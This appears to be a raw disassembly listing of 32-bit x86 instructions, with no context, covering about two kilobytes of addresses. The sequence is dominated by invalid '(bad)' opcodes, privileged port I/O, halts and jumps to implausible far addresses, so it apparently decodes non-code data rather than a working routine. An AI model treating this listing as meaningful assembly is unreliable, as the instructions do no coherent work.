  4180bb:	idiv   ebp
  4180bd:	call   0xd2e80a9
  4180c2:	in     al,dx
  4180c3:	stos   BYTE PTR es:[edi],al
  4180c4:	mov    cl,0xe4
  4180c6:	retf   
  4180c7:	jmp    0x4180a4
  4180c9:	mov    bl,0xb7
  4180cb:	leave  
  4180cc:	jmp    0xfac8:0x2e3ead0
  4180d3:	iret   
  4180d4:	fld    QWORD PTR [edx]
  4180d6:	in     al,dx
  4180d7:	cli    
  4180d8:	rcl    dl,1
  4180da:	rol    DWORD PTR ds:0xfec7c8d7,0xc4
  4180e1:	or     eax,0xdcc3cfae
  4180e6:	iret   
  4180e7:	iret   
  4180e8:	(bad)  
  4180e9:	retf   
  4180ea:	mov    ah,0xc9
  4180ec:	mov    ah,0xee
  4180ee:	cld    
  4180ef:	repz jecxz 0x4180e5
  4180f2:	mov    ecx,0xf2f5bcd3
  4180f7:	mul    ah
  4180f9:	std    
  4180fa:	out    0xe5,al
  4180fc:	(bad)  
  4180fd:	loopne 0x4180fc
  4180ff:	retf   
  418100:	int    0xf1
  418102:	lds    ebp,FWORD PTR [esi-0x33485349]
  418108:	in     al,0xdb
  41810a:	clc    
  41810b:	mov    dh,0xb5
  41810d:	mov    dh,0xb4
  41810f:	rcr    edi,cl
  418111:	mov    ebp,0x5efdbf0
  418116:	sar    ebp,cl
  418118:	cli    
  418119:	inc    DWORD PTR ds:0xe2f8dde9
  41811f:	out    dx,al
  418120:	or     al,0xc9
  418122:	mov    esi,0xedd2b2a6
  418127:	mov    bh,0xac
  418129:	cli    
  41812a:	mov    cl,0xd4
  41812c:	mov    ecx,0xfeeee4cf
  418131:	ffreep st(1)
  418133:	ret    
  418134:	fiadd  DWORD PTR [ebx]
  418136:	cmc    
  418137:	hlt    
  418138:	or     eax,edi
  41813a:	fcmovnu st,st(4)
  41813c:	fild   DWORD PTR [esp+ebp*8]
  41813f:	adc    eax,DWORD PTR [esi]
  418141:	fdivr  st(0),st
  418143:	(bad)  
  418144:	leave  
  418145:	not    cl
  418147:	in     eax,0xb6
  418149:	fucomi st,st(6)
  41814b:	cmc    
  41814c:	repnz aam 0xb4
  41814f:	mov    edi,0xdcf2ba03
  418154:	cli    
  418155:	fsubrp st(4),st
  418157:	cmc    
  418158:	add    esi,edx
  41815a:	loope  0x418141
  41815c:	loopne 0x418149
  41815e:	pop    es
  41815f:	ficom  WORD PTR [edx]
  418161:	shl    esp,cl
  418163:	loopne 0x41810a
  418165:	icebp  
  418166:	hlt    
  418167:	enter  0xd4bb,0xc9
  41816b:	loopne 0x418137
  41816d:	div    bl
  41816f:	mov    ebp,0xdcd9dbba
  418174:	rcl    dh,1
  418176:	test   edx,0xf6e20705
  41817c:	std    
  41817d:	or     eax,0xca0acedf
  418182:	out    dx,al
  418183:	in     al,dx
  418184:	mov    dl,0xea
  418186:	into   
  418187:	aam    0xf3
  418189:	fld    st(4)
  41818b:	rcr    bl,cl
  41818d:	repnz shr ebp,cl
  418190:	retf   
  418191:	lock std 
  418193:	mov    esi,0xd9c7c2de
  418198:	loope  0x418179
  41819a:	fsubrp st(7),st
  41819c:	neg    bh
  41819e:	add    bh,bl
  4181a0:	loopne 0x41819f
  4181a2:	mov    ecx,0xc9c0beec
  4181a7:	ret    0xa8c3
  4181aa:	hlt    
  4181ab:	(bad)  
  4181ac:	in     al,dx
  4181ad:	shl    DWORD PTR [esi-0x12110806],1
  4181b3:	shl    al,1
  4181b5:	mov    esi,0xd6b9d2df
  4181ba:	add    ch,al
  4181bc:	add    esi,esp
  4181be:	out    0xdf,al
  4181c0:	in     eax,0xe7
  4181c2:	out    dx,eax
  4181c3:	test   eax,0xc3acede6
  4181c8:	out    dx,al
  4181c9:	retf   0xc8f6
  4181cc:	shl    dh,1
  4181ce:	jmp    0xe32371c0
  4181d3:	cli    
  4181d4:	std    
  4181d5:	add    edx,esp
  4181d7:	aad    0xe2
  4181d9:	jmp    0x4181e4
  4181db:	mul    esi
  4181dd:	retf   
  4181de:	jmp    0xf7cf:0xe8e2fd0f
  4181e5:	shl    ah,1
  4181e7:	icebp  
  4181e8:	(bad)  
  4181e9:	mov    ebx,0xc9f9d1b7
  4181ee:	mov    bh,0xb5
  4181f0:	jmp    0x4181ac
  4181f2:	(bad)  
  4181f3:	std    
  4181f4:	loopne 0x4181bd
  4181f6:	fcomi  st,st(1)
  4181f8:	repnz add ecx,DWORD PTR [eax]
  4181fb:	out    0xff,eax
  4181fd:	in     al,0xdb
  4181ff:	les    ecx,FWORD PTR ds:0xf7d3f111
  418205:	icebp  
  418206:	int3   
  418207:	retf   0xc8bb
  41820a:	hlt    
  41820b:	mov    bh,0xf7
  41820d:	mov    al,0xf1
  41820f:	retf   0xddcf
  418212:	repz int3 
  418214:	clc    
  418215:	ret    
  418216:	std    
  418217:	(bad)  
  418218:	loop   0x4181ff
  41821a:	in     eax,0xe8
  41821c:	in     eax,0xe0
  41821e:	in     eax,dx
  41821f:	or     eax,0xcbcb11e7
  418224:	jmp    0xd7225f14
  418229:	int3   
  41822a:	mov    ah,0xcb
  41822d:	mov    ch,0xec
  41822f:	mov    ebp,0xd5d7b9fb
  418234:	mov    eax,0xe4e3bf06
  418239:	(bad)
  41823d:	fsub   st,st(6)
  41823f:	call   0xc532632f
  418244:	idiv   DWORD PTR [esi-0x10174923]
  41824a:	lock shl dl,cl
  41824d:	out    dx,eax
  41824e:	jmp    0xcdf0:0x1dcfbeb
  418255:	cmc    
  418256:	fild   DWORD PTR [eax]
  418258:	(bad)
  41825b:	mov    esi,0xc50eddc5
  418260:	fcmovbe st,st(3)
  418262:	fidivr WORD PTR [edi-0x953152a]
  418268:	(bad)  
  41826a:	aad    0xcd
  41826c:	xlat   BYTE PTR ds:[ebx]
  41826d:	jmp    0x418244
  41826f:	mov    dh,0xda
  418271:	(bad)  
  418273:	in     eax,dx
  418274:	ret    
  418275:	int3   
  418276:	fild   WORD PTR [ebx]
  418278:	loope  0x41825a
  41827a:	fdivrp st(7),st
  41827c:	jmp    0x41828c
  41827e:	or     eax,0xeceff9de
  418283:	mov    ebp,0xb7c1ddbe
  418288:	in     eax,0xe0
  41828a:	retf   0xdee6
  41828d:	enter  0xf3c4,0xb9
  418291:	fcmovnbe st,st(3)
  418293:	repz push es
  418295:	rcl    al,cl
  418297:	out    0xf4,eax
  418299:	shl    dl,1
  41829b:	jecxz  0x418277
  41829d:	(bad)  
  41829e:	aam    0xc5
  4182a0:	or     cl,BYTE PTR ds:0xc1b1bed3
  4182a6:	ret    
  4182a7:	loop   0x41828f
  4182a9:	mov    dh,0xe0
  4182ab:	out    0xf7,eax
  4182ad:	shr    ebp,cl
  4182af:	(bad)  
  4182b0:	call   eax
  4182b2:	std    
  4182b3:	fcmovnb st,st(7)
  4182b5:	pop    es
  4182b6:	faddp  st(1),st
  4182b8:	rcl    ch,0xf4
  4182bb:	cmc    
  4182bc:	jmp    0xd3cc:0x9fde2d8
  4182c3:	shr    BYTE PTR [eax-0xa370a1b],0xb0
  4182ca:	mov    edx,0xcfecd2ff
  4182cf:	mov    ch,0xf9
  4182d1:	int3   
  4182d2:	mov    bh,0xbd
  4182d4:	add    esi,esp
  4182d6:	ret    0xd7fd
  4182d9:	add    BYTE PTR [ebx+eiz*8],al
  4182dc:	fdivr  QWORD PTR [ecx+edi*8-0x4c3bfb01]
  4182e3:	leave  
  4182e4:	in     al,0xbd
  4182e6:	in     eax,dx
  4182e7:	mov    bh,0xd3
  4182e9:	shr    bl,1
  4182eb:	out    0xdb,eax
  4182ed:	fldlg2 
  4182ef:	shl    edx,1
  4182f1:	int3   
  4182f2:	out    dx,eax
  4182f3:	imul   ch
  4182f5:	ret    
  4182f6:	mov    esp,0xdbb8f2f6
  4182fb:	sti    
  4182fc:	retf   
  4182fd:	jmp    0x4182eb
  4182ff:	cld    
  418300:	call   0xe6195ce5
  418305:	leave  
  418306:	int3   
  418307:	out    dx,al
  418308:	call   0xec2f49f3
  41830d:	clc    
  41830e:	fcmovbe st,st(4)
  418310:	fcomip st,st(2)
  418312:	leave  
  418313:	int3   
  418314:	shr    ch,1
  418316:	fistp  QWORD PTR [esi-0x2a38fb2f]
  41831c:	fsubr  st,st(5)
  41831e:	push   es
  41831f:	pop    es
  418320:	enter  0xe6dd,0xc6
  418324:	out    0xea,eax
  418326:	shl    esi,cl
  418328:	enter  0xe0b6,0xf9
  41832c:	fcmovne st,st(5)
  41832e:	mov    ebx,0xefd7e3ce
  418333:	loopne 0x41830f
  418335:	int3   
  418336:	push   es
  418337:	les    ecx,FWORD PTR [ebx]
  418339:	cld    
  41833a:	out    0xeb,al
  41833c:	add    esi,ebp
  41833e:	or     al,0xdc
  418340:	fdivp  st(4),st
  418342:	icebp  
  418343:	in     eax,dx
  418344:	div    eax
  418346:	xlat   BYTE PTR ds:[ebx]
  418347:	out    0xea,al
  418349:	(bad)  
  41834a:	enter  0xfef7,0xc9
  41834e:	call   0xbf1f5e32
  418353:	(bad)  
  418355:	fld    QWORD PTR [eax]
  418357:	loopne 0x41833f
  418359:	rcl    eax,1
  41835b:	retf   
  41835c:	(bad)  
  41835e:	out    0xd,eax
  418360:	or     eax,ebx
  418362:	repz test eax,0xd2e2dcf7
  418368:	iret   
  418369:	rcl    ebx,0xc8
  41836c:	in     eax,0xb0
  41836e:	in     al,0xf8
  418370:	add    edi,esp
  418372:	jmp    0xbf224146
  418377:	les    eax,FWORD PTR [ebx]
  418379:	loopne 0x418374
  41837b:	or     al,cl
  41837d:	inc    DWORD PTR [eax]
  41837f:	stc    
  418380:	push   cs
  418381:	add    eax,ebx
  418383:	out    0xe7,eax
  418385:	lods   eax,DWORD PTR ds:[esi]
  418386:	shl    cl,0xee
  418389:	shr    bh,0xcc
  41838c:	in     eax,0xe8
  41838e:	rcr    ebx,cl
  418390:	mov    ebx,0xbcdb01ba
  418395:	ret    0xfcfe
  418398:	add    al,0xdd
  41839a:	jmp    esi
  41839c:	jmp    0xda1a4e87
  4183a1:	(bad)  
  4183a2:	loopne 0x418377
  4183a4:	test   al,0xe9
  4183a6:	ret    0xb5d3
  4183a9:	mov    cl,0xb2
  4183ab:	in     eax,dx
  4183ac:	mov    al,0xd7
  4183ae:	fmul   st,st(7)
  4183b0:	fdivp  st(6),st
  4183b2:	faddp  st(2),st
  4183b4:	jecxz  0x4183b4
  4183b6:	mov    edi,0x5e601f0
  4183bb:	out    0xe2,al
  4183bd:	(bad)
  4183c0:	adc    bh,al
  4183c2:	icebp  
  4183c3:	lods   al,BYTE PTR ds:[esi]
  4183c4:	test   eax,0xc4f1ceee
  4183c9:	shl    dh,1
  4183cb:	shl    ch,1
  4183cd:	in     al,0xeb
  4183cf:	iret   
  4183d0:	imul   dh
  4183d2:	mov    ebx,0xf8cde7d2
  4183d7:	(bad)  
  4183d8:	(bad)  
  4183d9:	fdivp  st(6),st
  4183db:	add    esp,esp
  4183dd:	(bad)  
  4183de:	or     DWORD PTR [ebx],eax
  4183e0:	retf   
  4183e1:	fmul   st,st(1)
  4183e3:	in     eax,0xc8
  4183e5:	ffree  st(4)
  4183e7:	shr    ch,0xf2
  4183ea:	mov    ah,0xcd
  4183ec:	int3   
  4183ed:	(bad)  
  4183ef:	mov    eax,0xdbedbbba
  4183f4:	hlt    
  4183f5:	(bad)  
  4183f6:	in     al,dx
  4183f7:	fdivr  DWORD PTR [ebp-0x27242f0b]
  4183fd:	aam    0xd9
  4183ff:	(bad)  
  418400:	adc    ah,dh
  418402:	(bad)  
  418403:	in     al,0xd7
  418405:	in     eax,0xe7
  418407:	mov    bh,0xf3
  418409:	shr    al,0xb0
  41840c:	rcl    dh,1
  41840e:	mov    eax,0xc201badc
  418413:	(bad)  
  418414:	fcmovnb st,st(2)
  418416:	(bad)  
  418418:	(bad)  
  41841a:	pop    es
  41841b:	dec    bh
  41841d:	add    eax,0x11d3e4ff
  418422:	mov    edi,0xebecb0d3
  418427:	out    0xe3,al
  418429:	repnz int3 
  41842b:	enter  0xf0ad,0xcd
  41842f:	in     al,dx
  418430:	xlat   BYTE PTR ds:[ebx]
  418431:	mov    al,0xc3
  418433:	rcl    edi,0xd4
  418436:	cld    
  418437:	sar    dh,0x7
  41843a:	in     al,0xde
  41843c:	fcmovnbe st,st(4)
  41843e:	add    eax,DWORD PTR [edx]
  418440:	jmp    0xf3f2414e
  418445:	ror    ecx,cl
  418447:	mov    al,0xfb
  418449:	repz lock out 0xb8,eax
  41844d:	jmp    0x7cf:0xb9bbd7ed
  418454:	mov    edi,0xc2ebc6df
  418459:	jmp    0x418453
  41845b:	lock test BYTE PTR [edx],0xc6
  41845f:	or     al,0x7
  418461:	adc    bl,cl
  418463:	in     al,dx
  418464:	enter  0xe3c5,0xe8
  418468:	iret   
  418469:	(bad)
  41846c:	out    dx,eax
  41846d:	lock cli 
  41846f:	fnstcw WORD PTR [edx-0x1c473c05]
  418475:	int3   
  418476:	aad    0xd7
  418478:	or     ebx,edi
  41847a:	(bad)  
  41847b:	std    
  41847c:	out    dx,eax
  41847d:	or     ebp,esp
  41847f:	in     al,dx
  418480:	fild   WORD PTR [eax]
  418482:	out    dx,al
  418483:	mov    esp,0xdce3e2bc
  418488:	iret   
  418489:	shr    cl,1
  41848b:	aad    0xd7
  41848d:	fdivp  st(5),st
  41848f:	fxch   st(1)
  418491:	retf   0x1ff
  418494:	in     eax,dx
  418495:	int    0xd9
  418497:	hlt    
  418498:	rcr    esi,1
  41849a:	fcomp  st(0)
  41849c:	jmp    0x418483
  41849e:	or     ecx,DWORD PTR [ecx]
  4184a0:	or     ebx,esi
  4184a2:	out    dx,eax
  4184a3:	mov    bl,0xcc
  4184a5:	fucom  st(3)
  4184a7:	sti    
  4184a8:	int3   
  4184a9:	sti    
  4184aa:	out    0xe4,eax
  4184ac:	clc    
  4184ad:	lock mov edx,0xbbd8cdb8
  4184b3:	rol    bh,1
  4184b5:	ffreep st(5)
  4184b7:	ret    0xc4e0
  4184ba:	(bad)  
  4184bb:	cli    
  4184bc:	in     al,0xef
  4184be:	fdivp  st(4),st
  4184c0:	jmp    0xcc0b4bd6
  4184c5:	retf   
  4184c6:	stos   DWORD PTR es:[edi],eax
  4184c7:	lods   al,BYTE PTR ds:[esi]
  4184c8:	lods   eax,DWORD PTR ds:[esi]
  4184c9:	mov    edx,0xb9f4f5c1
  4184ce:	enter  0xeab8,0xdc
  4184d2:	cli    
  4184d3:	cli    
  4184d4:	pop    es
  4184d5:	fnstsw ax
  4184d7:	fdivp  st(3),st
  4184d9:	add    eax,0xfdfc09fe
  4184de:	retf   
  4184df:	or     eax,0xeccbc0c8
  4184e4:	shl    bl,0xed
  4184e7:	sti    
  4184e8:	ret    0xf1ca
  4184eb:	jmp    0x4184a3
  4184ed:	cmc    
  4184ee:	mov    ecx,0x1dddbd8
  4184f3:	fucomp st(5)
  4184f5:	out    0xf8,al
  4184f7:	icebp  
  4184f8:	push   es
  4184f9:	sar    bh,0xf4
  4184fc:	aam    0x2
  4184fe:	hlt    
  4184ff:	int    0x7
  418501:	(bad)  
  418503:	lods   al,BYTE PTR ds:[esi]
  418504:	mov    bh,0xe5
  418506:	(bad)  
  418507:	shl    cl,1
  418509:	mov    cl,0xc9
  41850b:	loopne 0x4184fb
  41850d:	(bad)  
  41850e:	shr    edi,1
  418510:	mov    ecx,0xbaf9fd
  418515:	out    dx,al
  418516:	jecxz  0x4184dc
  418518:	add    ch,bl
  41851a:	icebp  
  41851b:	sti    
  41851c:	iret   
  41851d:	(bad)  
  41851e:	(bad)  
  418520:	iret   
  418521:	fldcw  WORD PTR [ebp-0xf3b3d12]
  418527:	into   
  418528:	repz out dx,al
  41852a:	(bad)  
  41852b:	in     eax,0xcd
  41852d:	mov    ebx,0xc2f7cafe
  418532:	dec    bh
  418534:	into   
  418535:	mov    ebp,0xd0bcd4f2
  41853a:	add    dl,bl
  41853c:	fcmovnu st,st(7)
  41853e:	in     eax,dx
  41853f:	fldl2t 
  418541:	icebp  
  418542:	in     al,0xea
  418544:	mov    ebp,0xf0c3cbd7
  418549:	test   al,0xf5
  41854b:	retf   0xe5f4
  41854e:	shl    dl,1
  418550:	ror    eax,1
  418552:	loopne 0x418528
  418554:	jecxz  0x41851d
  418556:	pop    es
  418557:	add    al,0xdc
  418559:	(bad)  
  41855a:	leave  
  41855b:	or     edi,ebp
  41855d:	retf   0xebc5
  418560:	add    cl,bl
  418562:	stos   BYTE PTR es:[edi],al
  418563:	leave  
  418564:	repz repnz mov cl,0xd7
  418568:	retf   0xbbb6
  41856b:	(bad)  
  41856c:	mov    edx,0xe2f3b3f6
  418571:	out    dx,eax
  418572:	(bad)  
  418573:	fcom   st(4)
  418575:	fcmovnbe st,st(1)
  418577:	pop    es
  418578:	sar    DWORD PTR [ebx+ebx*8-0x6fc051a],cl
  41857f:	fcomi  st,st(2)
  418581:	(bad)  
  418583:	scas   al,BYTE PTR es:[edi]
  418584:	into   
  418585:	into   
  418586:	ror    al,cl
  418588:	in     eax,0xe8
  41858a:	mov    ah,0xe9
  41858c:	jmp    0x418563
  41858e:	stc    
  41858f:	in     eax,dx
  418590:	jmp    0x41856b
  418592:	sti    
  418593:	lock stc 
  418595:	cld    
  418596:	stc    
  418597:	(bad)
  41859a:	idiv   DWORD PTR [esi+0x1ef05e8]
  4185a0:	retf   
  4185a1:	into   
  4185a2:	mov    esi,0xddb7b7d3
  4185a7:	shl    BYTE PTR [ebx-0x6182e09],cl
  4185ad:	mov    al,0xf5
  4185af:	iret   
  4185b0:	into   
  4185b1:	mov    edi,0xc003d4f7
  4185b6:	aam    0xc5
  4185b8:	mov    ebp,0xe705c3fd
  4185bd:	fsub   st,st(5)
  4185bf:	loop   0x4185bd
  4185c1:	in     al,0xe9
  4185c3:	icebp  
  4185c4:	scas   al,BYTE PTR es:[edi]
  4185c5:	in     eax,dx
  4185c6:	icebp  
  4185c7:	les    esi,FWORD PTR [ebp-0x303a183c]
  4185cd:	enter  0xd3d2,0xe2
  4185d1:	aam    0xcd
  4185d3:	jecxz  0x418595
  4185d5:	stc    
  4185d6:	loope  0x4185af
  4185d8:	add    edx,esi
  4185da:	jmp    0xfccc:0xd5e9faca
  4185e1:	(bad)  
  4185e3:	mov    cl,0xc5
  4185e5:	into   
  4185e6:	retf   0xe3f2
  4185e9:	(bad)  
  4185ea:	mov    dl,0xff
  4185ec:	into   
  4185ed:	mov    ecx,0xe2c9bdd5
  4185f2:	fnstcw WORD PTR [ebp-0x2f192432]
  4185f8:	(bad)  
  4185fa:	out    0xdb,eax
  4185fc:	fimul  DWORD PTR [ebx]
  4185fe:	stc    
  4185ff:	int    0xcd
  418601:	int3   
  418602:	fsubrp st(3),st
  418604:	test   ecx,0xc0adebf2
  41860a:	leave  
  41860b:	out    0xef,al
  41860d:	hlt    
  41860e:	aam    0xcf
  418610:	int    0xd1
  418612:	bnd jmp ecx
  418615:	(bad)  
  418617:	idiv   dl
  418619:	jmp    0x4185dc
  41861b:	or     DWORD PTR [edx],ecx
  41861d:	or     al,bh
  41861f:	pop    es
  418620:	(bad)  
  418621:	fcmovbe st,st(2)
  418623:	in     al,dx
  418624:	(bad)  
  418625:	out    0xed,al
  418627:	mov    dh,0xc2
  418629:	retf   
  41862a:	fcmovbe st,st(3)
  41862c:	fdivr  st,st(6)
  41862e:	xlat   BYTE PTR ds:[ebx]
  41862f:	sti    
  418630:	mov    eax,0xd3bddcf0
  418635:	cmc    
  418636:	std    
  418637:	mov    esp,0xf002fed6
  41863c:	enter  0xe3db,0xcb
  418640:	repz out 0xa7,eax
  418643:	mov    al,0xe4
  418645:	(bad)  
  418646:	fsub   st(5),st
  418648:	jmp    0x4185f6
  41864a:	loopne 0x418635
  41864c:	les    ebp,FWORD PTR [eax+edi*4-0x46080d4a]
  418653:	loop   0x418638
  418655:	pop    es
  418656:	add    dh,cl
  418658:	loope  0x41865d
  41865a:	(bad)  
  41865b:	neg    edi
  41865d:	fisttp WORD PTR [edi]
  41865f:	retf   
  418660:	cli    
  418661:	in     al,0xc1
  418663:	loopne 0x418634
  418665:	jecxz  0x418630
  418667:	iret   
  418668:	shl    ebx,1
  41866a:	in     eax,dx
  41866b:	aad    0xed
  41866d:	mov    edx,0xd8b4dafd
  418672:	fadd   DWORD PTR [eax]
  418674:	ret    
  418675:	pop    es
  418676:	fcmovnbe st,st(0)
  418678:	in     al,0xdc
  41867a:	lds    eax,FWORD PTR [ecx]
  41867c:	sar    ch,0x9
  41867f:	add    ebx,ebx
  418681:	cli    
  418682:	jecxz  0x418669
  418684:	test   al,0xc2
  418686:	lods   eax,DWORD PTR ds:[esi]
  418687:	mov    cl,0xd7
  418689:	icebp  
  41868a:	int    0xe4
  41868c:	clc    
  41868d:	aam    0xc9
  41868f:	shl    eax,cl
  418691:	sar    BYTE PTR [eax-0x1241f801],1
  418697:	out    0xd5,eax
  418699:	ret    0xe3cb
  41869c:	out    0xe1,eax
  41869e:	or     eax,0xc2e0fedf
  4186a3:	ret    0xb3cd
  4186a6:	retf   0xb7d1
  4186a9:	repz imul esp
  4186ac:	fsubp  st(4),st
  4186ae:	shr    ebp,1
  4186b0:	iret   
  4186b1:	in     eax,dx
  4186b2:	sar    eax,0xee
  4186b5:	push   es
  4186b6:	sti    
  4186b7:	neg    eax
  4186b9:	add    eax,0xf9c6d9cb
  4186be:	std    
  4186bf:	push   es
  4186c0:	lds    ecx,FWORD PTR ds:0xb6a5b2ef
  4186c6:	out    dx,eax
  4186c7:	aam    0xc0
  4186c9:	jmp    0xbed3:0xd9b4d5db
  4186d0:	fidivr WORD PTR [ebx-0x2d101f2a]
  4186d6:	add    eax,0xf900e7fa
  4186db:	neg    dl
  4186dd:	cmc    
  4186de:	cmc    
  4186df:	(bad)  
  4186e2:	in     eax,0xc7
  4186e4:	repz jecxz 0x4186d1
  4186e7:	jmp    0xda1542be
  4186ec:	retf   0xe5c8
  4186ef:	mov    dh,0xda
  4186f1:	mov    ebx,0xd9f6b6ed
  4186f6:	add    al,0xb
  4186f8:	inc    al
  4186fa:	(bad)  
  4186fb:	fld    DWORD PTR [edx]
  4186fd:	fucomp st(2)
  4186ff:	fsubr  st,st(2)
  418701:	jmp    0x4186bb
  418703:	iret   
  418704:	(bad)
  418707:	(bad)  
  418709:	sti    
  41870a:	fnsetpm(287 only) 
  41870c:	jmp    0xb9144206
  418711:	mov    ecx,0xf9d4d8e2
  418716:	fprem1 
  418718:	add    al,0xd6
  41871a:	pop    es
  41871b:	fsub   st(2),st
  41871d:	add    ebp,edx
  41871f:	dec    BYTE PTR [edx]
  418721:	rcr    bh,0xef
  418724:	repnz in eax,0xf3
  418727:	aam    0xea
  418729:	test   esi,0xd3cbd7b6
  41872f:	out    dx,al
  418730:	mov    edi,0xb907e9f1
  418735:	shl    ch,0xd2
  418738:	cli    
  418739:	(bad)
  41873c:	cli    
  41873d:	enter  0xefe1,0xe9
  418741:	clc    
  418742:	shl    BYTE PTR [esi-0x3314511b],cl
  418748:	out    dx,al
  418749:	out    dx,al
  41874a:	int    0xe5
  41874c:	aad    0xff
  41874e:	(bad)  
  41874f:	cld    
  418750:	mov    edx,0xd1cee3b0
  418755:	ret    
  418756:	ret    0xc1fb
  418759:	or     cl,BYTE PTR [eax]
  41875b:	std    
  41875c:	add    eax,ecx
  41875e:	in     al,dx
  41875f:	std    
  418760:	fld    QWORD PTR [edx]
  418762:	mov    cl,0xd1
  418764:	loopne 0x418719
  418766:	out    dx,eax
  418767:	xlat   BYTE PTR ds:[ebx]
  418768:	in     al,dx
  418769:	mov    al,0xd3
  41876b:	mov    ch,0xe6
  41876d:	mov    bh,0xd0
  41876f:	jmp    0xf02f712e
  418774:	icebp  
  418775:	fnop   
  418777:	sar    ah,1
  418779:	(bad)  
  41877a:	cmc    
  41877b:	psubusw mm3,mm3
  41877e:	jmp    0xc51a5165
  418783:	fdivr  st(2),st
  418785:	shl    esi,cl
  418787:	mov    al,0xe2
  418789:	cmc    
  41878a:	mov    ah,0xb4
  41878c:	cmc    
  41878d:	(bad)  
  41878f:	enter  0xf1d8,0xd0
  418793:	fucomp st(6)
  418795:	int3   
  418796:	int3   
  418797:	ret    
  418798:	loop   0x418797
  41879a:	les    edi,FWORD PTR [esi-0x26ff0940]
  4187a0:	int3   
  4187a1:	or     ch,BYTE PTR [ebp-0x1b412e42]
  4187a7:	mov    ah,0xcf
  4187a9:	jmp    0xf4f6:0xacb8cbe4
  4187b0:	int3   
  4187b1:	mov    ah,0xc1
  4187b3:	int    0xce
  4187b5:	loopne 0x41879d
  4187b7:	(bad)  
  4187b9:	aad    0xf8
  4187bb:	cld    
  4187bc:	hlt    
  4187bd:	add    eax,0xce3cae4
  4187c2:	ret    0xe6ef
  4187c5:	mov    dl,0xed
  4187c7:	mov    ah,0xad
  4187c9:	neg    edx
  4187cb:	in     al,0xda
  4187cd:	hlt    
  4187ce:	mov    bl,0xb2
  4187d0:	jmp    0xdbd0:0xccf2faf5
  4187d7:	repnz or bh,dl
  4187da:	std    
  4187db:	push   es
  4187dc:	(bad)  
  4187dd:	retf   
  4187de:	dec    BYTE PTR [edx]
  4187e0:	adc    edi,edi
  4187e2:	mov    ebp,0xe4b7bec7
  4187e7:	mov    bh,0xeb
  4187e9:	mov    ch,0xc7
  4187eb:	mov    dh,0xed
  4187ee:	mov    bh,0xff
  4187f0:	add    eax,DWORD PTR [edx]
  4187f2:	enter  0xe1f5,0xd6
  4187f6:	fnstsw WORD PTR [ebp-0x1d1e3a2b]
  4187fc:	fcomp  st(6)
  4187fe:	add    eax,0xdfe10813
  418803:	in     eax,dx
  418804:	int    0xeb
  418806:	lock repz mov al,0xb0
  41880a:	retf   
  41880b:	xlat   BYTE PTR ds:[ebx]
  41880c:	in     al,dx
  41880d:	sar    BYTE PTR [edx-0x3641443c],cl
  418813:	call   0xd61876d7
  418818:	jmp    0xfbe3:0xe4f5c2f9
  41881f:	clc    
  418820:	jmp    0x41881f
  418822:	fdiv   DWORD PTR [ebx-0x2f17110a]
  418828:	enter  0xb2f9,0xc8
  41882c:	lods   eax,DWORD PTR ds:[esi]
  41882d:	jmp    0xd9e1:0xc2f5bbf2
  418834:	out    dx,al
  418835:	cli    
  418836:	(bad)  
  418838:	(bad)  
  418839:	in     al,0xf4
  41883b:	jecxz  0x418823
  41883d:	or     eax,0xae20de6
  418842:	fucom  st(1)
  418844:	fbstp  TBYTE PTR [esi-0xa153114]
  41884a:	repnz sti 
  41884c:	in     al,0xcc
  41884e:	mov    edx,0xcfd8d8e8
  418853:	(bad)  
  418854:	mov    eax,0x3e4d7d2
  418859:	(bad)
  41885c:	out    dx,al
  41885d:	test   bh,0x13
  418860:	ror    eax,cl
  418862:	(bad)  
  418863:	out    0xd7,eax
  418865:	in     eax,dx
  418866:	repnz in eax,0xcc
  418869:	out    0xd0,eax
  41886b:	ror    cl,1
  41886d:	mov    ah,0xf3
  41886f:	(bad)  
  418871:	ror    esi,cl
  418873:	not    ah
  418875:	mov    edi,0x4e406c0
  41887a:	in     al,0xc6
  41887c:	add    edx,esi
  41887e:	clc    
  41887f:	fmul   st(1),st
  418881:	loop   0x418846
  418883:	lods   al,BYTE PTR ds:[esi]
  418884:	icebp  
  418885:	call   0xebf8555c
  41888a:	aam    0xf3
  41888c:	mov    eax,0xd003b8ff
  418891:	cli    
  418892:	xlat   BYTE PTR ds:[ebx]
  418893:	mov    edx,0xe3dbf0be
  418898:	xlat   BYTE PTR ds:[ebx]
  418899:	fsubp  st(0),st
  41889b:	(bad)  
  41889c:	cli    
  41889d:	or     eax,0xf808ceed
  4188a2:	in     al,0xee
  4188a4:	test   eax,0xd3dbaff5
  4188a9:	jmp    0xcab9:0xf5d7b5b9
  4188b0:	mov    eax,0xd6c8c1ca
  4188b5:	mov    esp,0xc2dcc7db
  4188ba:	aam    0xc0
  4188bc:	call   0x60989ca
  4188c1:	fsubr  QWORD PTR [ebx-0x3b1d5a2e]
  4188c7:	scas   al,BYTE PTR es:[edi]
  4188c8:	lock lock repnz aam 0xee
  4188cd:	stc    
  4188ce:	out    dx,eax
  4188cf:	mov    ah,0xd6
  4188d1:	fnstsw WORD PTR [eax-0xb3e2e2b]
  4188d7:	rcl    ebx,1
  4188d9:	cld    
  4188da:	add    al,ah
  4188dc:	loop   0x4188cc
  4188de:	iret   
  4188df:	sti    
  4188e0:	in     al,dx
  4188e1:	(bad)  
  4188e3:	in     eax,0xb2
  4188e5:	out    dx,eax
  4188e6:	rol    al,cl
  4188e8:	loope  0x4188bd
  4188ea:	ror    dh,0xda
  4188ed:	repz shr esi,1
  4188f0:	xlat   BYTE PTR ds:[ebx]
  4188f1:	test   BYTE PTR [ebx],0xbf
  4188f4:	icebp  
  4188f5:	in     al,dx
  4188f6:	fcmovnu st,st(5)
  4188f8:	shl    esp,1
  4188fa:	pop    es
  4188fb:	div    esi
  4188fd:	jmp    0xe8f3:0xdfeefed5
  418904:	mov    ebp,0xe9c7ccc8
  418909:	shl    ebp,cl
  41890b:	mov    ch,0xd9
  41890d:	out    dx,al
  41890e:	clc    
  41890f:	int3   
  418910:	retf   0xd8ca
  418913:	int    0xd0
  418915:	mov    edi,0xd5c7dbfe
  41891a:	aad    0xf6
  41891c:	fild   DWORD PTR ds:0xcce6fd08
  418922:	retf   0xe7ce
  418925:	in     al,0xe6
  418927:	scas   al,BYTE PTR es:[edi]
  418928:	xlat   BYTE PTR ds:[ebx]
  418929:	out    dx,al
  41892a:	call   0xfd20571e
  41892f:	aam    0xcf
  418931:	add    esi,ebp
  418933:	icebp  
  418934:	cmc    
  418935:	add    esp,esp
  418937:	or     esi,ecx
  418939:	icebp  
  41893a:	rol    BYTE PTR [ecx],0xe3
  41893d:	(bad)  
  41893e:	out    dx,al
  41893f:	aam    0x8
  418941:	push   es
